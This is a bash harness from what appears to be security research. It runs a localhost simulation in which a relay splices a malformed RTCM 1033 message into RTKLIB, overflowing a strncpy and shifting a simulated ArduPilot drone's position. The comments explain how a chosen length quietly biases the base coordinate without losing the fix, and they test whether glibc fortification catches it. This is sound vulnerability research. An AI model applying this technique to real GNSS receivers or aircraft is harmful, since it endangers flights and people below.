#!/bin/bash
# Packet to propeller: one continuous chain.
#
#   SITL truth --> gnss_sim --> [relay: splices the malicious 1033]
#                                    |
#                              RTKLIB (rtksvr)
#                                    |
#                                  NMEA
#                                    |
#                              SITL's GPS --> vehicle moves
#
# The aircraft's own position becomes the observations RTKLIB solves, and
# RTKLIB's solution is the aircraft's only GPS. So a corrupted base-station
# coordinate propagates all the way back into the flight control loop.
#
#   BIN=~/apsitl/arducopter RTKLIB=<checkout> ./loop_demo.sh [rectype_len]
#
# Startup order matters and runs BACKWARDS along the data flow: every server
# must be listening before its client starts. SITL gives up on its GPS port
# after ~11 retries and exits, which collapses the whole chain. The position
# feed is decoupled through a FIFO so gnss_sim can bind its ports before SITL
# (and therefore the feed) exists.
#
# No `set -e`: pieces come and go as the loop converges.

RTKLIB="${RTKLIB:?set RTKLIB to your RTKLIB checkout}"
BIN="${BIN:-$HOME/apsitl/arducopter}"
# 211, not 212. Zeroing four bytes of pos[0] quantises ECEF X to a 2 m lattice,
# so the induced error is bounded by one quantum for ANY base station -- always
# enough to matter, never enough to lose the fix, with no knowledge of the base
# coordinates. 212 zeroes five bytes: a 512 m quantum, which happened to land on
# 2.435 m against the old base and would have been 29 m against a different one.
# The demo runs on the rung that generalises. See "The dial has four rungs" in
# research/README.md.
LEN="${1:-211}"
# Must outlast the whole profile: ~40 s of staged startup, then EKF settle,
# arm and takeoff, then hold + attack + goto + land. If the streams stop
# first, SITL loses its GPS mid-flight and the run ends in a connection reset
# rather than a measurement.
RUN="${RUN:-260}"           # total seconds
HERE="$(cd "$(dirname "$0")" && pwd)"
T="${T:-/tmp/rtk-loop}"
TRIG="$T/attack.go"         # flight driver -> relay: "phase 1 is over"
mkdir -p "$T"
rm -f "$TRIG"
# Truncate the logs demo_view.py reads BEFORE anything else starts. Each is
# otherwise truncated only when its own stage begins, which leaves a window in
# which a viewer already running tails the PREVIOUS run to its end and shows
# phase 3 with the attack armed while this run is still compiling. A screen
# that says "attacking" when nothing is attacking is the exact failure the
# control run exists to catch; do not let the visualisation reintroduce it.
: > "$T/flight.log"; : > "$T/relay.log"; : > "$T/rtklib.log"
export LIBC_FATAL_STDERR_=1

# Sited so the n1=211 truncation is visible. The error at that length is
# |X| mod 2, which is 0.43 m at the old -3978242.4348 -- correct, universal, and
# too small to see from the back of a room. -3978243.8000 sits 1.80 m above the
# 2 m lattice point, and deliberately not 1.9998: a base 0.2 mm from the
# boundary would collapse to a ~0 m error under any sub-millimetre shift, and a
# live demo that silently shows nothing is worse than a smaller number.
# At an arbitrary real base the error is uniform in [0, 2) m, mean 1 m -- say so
# rather than implying 1.8 is what everyone gets.
BASE_ECEF=-3978243.8000,3382841.1715,3649902.7667
HOME_LLH=$(python3 -c "
import math
a=6378137.0; f=1/298.257223563; e2=f*(2-f)
x,y,z=(-3978243.8000,3382841.1715,3649902.7667)
lon=math.atan2(y,x); p=math.hypot(x,y); lat=math.atan2(z,p*(1-e2))
for _ in range(8):
    N=a/math.sqrt(1-e2*math.sin(lat)**2); h=p/math.cos(lat)-N
    lat=math.atan2(z,p*(1-e2*N/(N+h)))
print(f'{math.degrees(lat):.9f},{math.degrees(lon):.9f},{h:.4f}')")
echo "base/home: $HOME_LLH"

cleanup() {
    for p in arducopter gnss_sim e2e_loop; do pkill -x $p 2>/dev/null; done
    pkill -f inject_relay 2>/dev/null
    pkill -f mav_pos 2>/dev/null
    pkill -f nmea_hold 2>/dev/null
    [ -n "${holder:-}" ] && kill "$holder" 2>/dev/null
}
cleanup; sleep 1

# Every stage is a server its downstream neighbour must reach, and a stage that
# fails to bind takes the whole chain down silently: gnss_sim losing :5901/:5902
# to a leftover process produced no observables, so RTKLIB produced no solution,
# so SITL got no GPS and sat there with EKF flags=0x0400 until the flight driver
# gave up -- four minutes to report a port collision. Check each one instead.
require_port() {
    local port="$1" what="$2" i
    for i in $(seq 1 40); do
        if ss -ltn 2>/dev/null | grep -qE "[:.]$port\b"; then return 0; fi
        sleep 0.25
    done
    echo "FAILED: $what never started listening on :$port" >&2
    echo "  check $T/${3:-sim.log}; something else may be holding the port" >&2
    cleanup
    exit 1
}

echo "### building ###"
# Delete first, and test the compiler's exit status rather than the file's
# existence. Otherwise a failed build silently leaves the previous binary in
# place and the run measures code that is no longer on disk -- which happened,
# and cost a full flight plus the wrong conclusion from it.
# -DSVR_REUSEADDR: RTKLIB only sets SO_REUSEADDR on a TCP server when built
# with this, so without it every run leaves :5901/:5902/:5903 unbindable for
# the TIME_WAIT window and the next run dies at startup. A demo you cannot
# immediately retry is not a demo.
rm -f "$T/gnss_sim" "$T/e2e_loop"
gcc -I "$RTKLIB/src" -O2 -DSVR_REUSEADDR -o "$T/gnss_sim" "$HERE/gnss_sim.c" \
    "$RTKLIB"/src/*.c "$RTKLIB"/src/rcv/*.c -lm -lpthread || {
        echo "build failed: gnss_sim.c"; exit 1; }
# FORTIFY=1 builds the OTHER column: glibc's fortified strncpy detects the
# overflow and aborts the process instead of corrupting the coordinate. Default
# is unfortified, which is what every shipped build measured does and what the
# stage demo must keep doing -- do not change the default.
#
# That run measures TWO things, and the second is the one people miss. The
# aircraft detects the loss and lands itself (good -- it is the detectable
# column), but it cannot RTL without a position, so the landing happens wherever
# the attacker chose to send the packet. Analyse it with:
#
#   FORTIFY=1 HOLD=1 ./loop_demo.sh 211
#   ./land_drift.py $(ls -t /tmp/rtk-loop/logs/*.BIN | head -1)
#
# HOLD=1 is REQUIRED with FORTIFY=1 -- see the proxy comment below.
if [ -n "$FORTIFY" ]; then
    FORT_FLAGS="-D_FORTIFY_SOURCE=2"
else
    FORT_FLAGS="-U_FORTIFY_SOURCE"
fi
gcc -I "$RTKLIB/src" -O2 -DSVR_REUSEADDR $FORT_FLAGS -o "$T/e2e_loop" "$HERE/e2e_harness.c" \
    "$RTKLIB"/src/*.c "$RTKLIB"/src/rcv/*.c -lm -lpthread || {
        echo "build failed: e2e_harness.c"; exit 1; }
# A build that silently did not fortify would produce a clean run and the wrong
# conclusion from it. Test the import, not the flag.
if [ -n "$FORTIFY" ]; then
    if nm -u "$T/e2e_loop" 2>/dev/null | grep -q __strncpy_chk; then
        echo "fortified: __strncpy_chk present"
    else
        echo "FAILED: FORTIFY=1 but __strncpy_chk is absent -- not fortified" >&2
        exit 1
    fi
fi
[ -x "$T/gnss_sim" ] && [ -x "$T/e2e_loop" ] || { echo "build failed"; exit 1; }

cat > "$T/loop.parm" <<'EOF'
ARMING_CHECK 0
FRAME_CLASS 1
GPS_TYPE 5
GPS1_TYPE 5
SIM_GPS1_ENABLE 0
SERIAL3_PROTOCOL 5
SR0_POSITION 10
SR0_EXTRA1 10
SR0_EXTRA3 10
SR0_EXT_STAT 10
SR1_POSITION 10
SR1_EXTRA1 10
SR1_EXTRA3 10
SR1_EXT_STAT 10
SERIAL2_PROTOCOL 2
SR2_POSITION 10
SR2_EXTRA1 10
SR2_EXTRA3 10
SR2_EXT_STAT 10
EOF

AP_DEF="$HOME/ardupilot/Tools/autotest/default_params/copter.parm"
[ -f "$AP_DEF" ] && DEFAULTS="$AP_DEF,$T/loop.parm" || DEFAULTS="$T/loop.parm"

cd "$T" || exit 1
rm -f eeprom.bin pos.fifo
mkfifo pos.fifo
# Hold the write end open so gnss_sim's read does not see EOF before the
# position feed starts.
sleep "$((RUN + 60))" > pos.fifo &
holder=$!

echo "### 1. observable synthesiser (binds :5901 base, :5902 rover) ###"
"$T/gnss_sim" "$RTKLIB/test/data/rinex/07590920.05n" "$BASE_ECEF" \
    --live :5901 :5902 5 < pos.fifo > "$T/sim.log" 2>&1 &
# Each stage must be listening before the next connects, and a client that
# gives up takes the rest of the chain down with it.
require_port 5901 "gnss_sim (base)" sim.log
require_port 5902 "gnss_sim (rover)" sim.log

echo "### 2. on-path relay :5911 -> :5901 (injects when the aircraft says so) ###"
# Not a timer. Counting seconds from the consumer's connect couples the attack
# to every startup delay ahead of it, and it raced: in the 2026-07-26 run the
# relay armed 3.2 s BEFORE the aircraft left the ground, so phase 1 was never
# clean and the GUIDED hold target was captured from an already-corrupted
# position. The flight driver now creates $TRIG when it is airborne and
# holding, and the relay waits for it.
python3 "$HERE/inject_relay.py" --listen 5911 --upstream 127.0.0.1:5901 \
    --len "$LEN" --trigger "$TRIG" > "$T/relay.log" 2>&1 &
require_port 5911 "inject_relay" relay.log

# NMEA_VEL: the harness formats the NMEA itself and fills in a ground speed by
# differencing successive solutions. RTKLIB's server leaves the solution
# velocity at zero -- measured at a known 1 m/s, with prcopt.dynamics on and
# off -- so its RMC says 0.00 knots however fast the rover moves, and an
# autopilot fusing that is being told it is stationary mid-flight. That used to
# need EK3_SRC1_VELXY 0 to stay stable, which is a deviation from a stock
# configuration; with a real speed in the RMC the parameter is gone.
echo "### 3. RTKLIB: rover :5902, base via relay :5911, NMEA out :5903 ###"
NMEA_VEL=1 NMEA_TCP=:5903 "$T/e2e_loop" 127.0.0.1:5902 127.0.0.1:5911 "$RUN" 1 tcp \
    > "$T/rtklib.log" 2>&1 &
require_port 5903 "RTKLIB NMEA output" rtklib.log

# HOLD=1 puts a keep-alive proxy between RTKLIB and SITL. Needed for any run
# where RTKLIB is expected to DIE (see FORTIFY above): SITL's serial port is a
# tcpclient, so a dead producer closes the socket, SITL retries ~11 times and
# then exits -- and the simulator quitting is not the aircraft's failsafe. A
# real receiver crashing on a UART leaves the line up and silent, which is what
# the proxy reproduces. Off by default; transparent when on, which the
# unfortified control run is there to demonstrate.
GPS_PORT=5903
if [ -n "$HOLD" ]; then
    echo "### 3b. NMEA keep-alive proxy :5904 -> :5903 ###"
    python3 "$HERE/nmea_hold.py" --listen 5904 --upstream 127.0.0.1:5903 \
            --seconds "$RUN" > "$T/hold.log" 2>&1 &
    require_port 5904 "nmea_hold proxy" hold.log
    GPS_PORT=5904
fi

echo "### 4. SITL, taking its GPS from RTKLIB ###"
# Two MAVLink endpoints, not one. SERIAL0 takes a single client at a time, so
# the position feed and the flight driver sharing :5760 means whichever
# connects second gets EOF -- which looks exactly like a vehicle that will not
# arm. The feed gets SERIAL1, the flight driver keeps SERIAL0.
# SERIAL2 (:5763) is a third, independent MAVLink endpoint for demo_view.py to
# read ground truth from. A separate endpoint rather than a shared one for the
# reason SERIAL1 exists at all: these are single-client TCP sockets, so two
# consumers on one port means whichever connects second gets EOF. Nothing
# connects to it unless the viewer is running, and the viewer only ever reads.
"$BIN" --model quad --home "$HOME_LLH,0" --defaults "$DEFAULTS" \
       --serial0 tcp:5760 --serial1 tcp:5762 --serial2 tcp:5763 \
       --serial3 "tcpclient:127.0.0.1:$GPS_PORT" \
       > "$T/sitl.log" 2>&1 &
sleep 12

echo "### 5. position feed: SITL truth -> synthesiser (SERIAL1 :5762) ###"
python3 "$HERE/mav_pos.py" --conn tcp:127.0.0.1:5762 --rate 5 \
        --seconds "$RUN" > pos.fifo 2>"$T/mavpos.log" &
sleep 10

echo
echo "### flying ###"
# --no-glitch: the offset must reach the aircraft only through the corrupted
# base coordinate, so the flight driver injects nothing of its own.
# -u: stdout here is a pipe into tee, so it is block-buffered at 8 KB and
# flight.log lags the flight by minutes. demo_view.py tails it for the phase
# transitions and the runtime-chosen hold and waypoint coordinates, all of
# which are worthless late.
python3 -u "$HERE/ardupilot_demo.py" --conn tcp:127.0.0.1:5760 --no-glitch \
        --trigger-file "$TRIG" \
        --hold 25 --attack 40 --goto-time 55 2>&1 | tee "$T/flight.log" | tail -20

sleep 3
cleanup
wait 2>/dev/null

echo
echo "### relay ###";  tail -4 "$T/relay.log"
echo "### RTKLIB ###"; grep -E '^[0-9]{2}:|solutions emitted|final base' "$T/rtklib.log" | tail -6
LOG=$(ls -t "$T"/logs/*.BIN 2>/dev/null | head -1)
# The waypoint is chosen at runtime from wherever the aircraft was holding,
# so the parser has to be told which coordinate was actually commanded.
WP=$(sed -n 's/^waypoint: //p' "$T/flight.log" | tail -1)
[ -n "$LOG" ] && { echo; echo "### aircraft ###";
    python3 "$HERE/parse_sitl_log.py" "$LOG" ${WP:+--target "$WP"}; }
